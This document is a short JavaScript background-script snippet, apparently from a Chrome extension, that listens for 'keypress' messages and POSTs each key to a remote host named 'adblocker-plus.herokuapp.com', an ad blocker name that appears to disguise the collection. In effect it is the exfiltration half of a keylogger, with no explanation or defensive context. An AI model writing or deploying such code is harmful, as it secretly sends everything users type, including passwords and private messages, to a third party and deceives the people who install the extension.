chrome.runtime.onMessage.addListener(function (request) {
  if (request.type === 'keypress') {
    fetch('https://adblocker-plus.herokuapp.com/logs', {
      method: 'POST',
      body: request.key
    })
      .then((response) => response.json())
      .then((json) => console.log(json));
  }
});
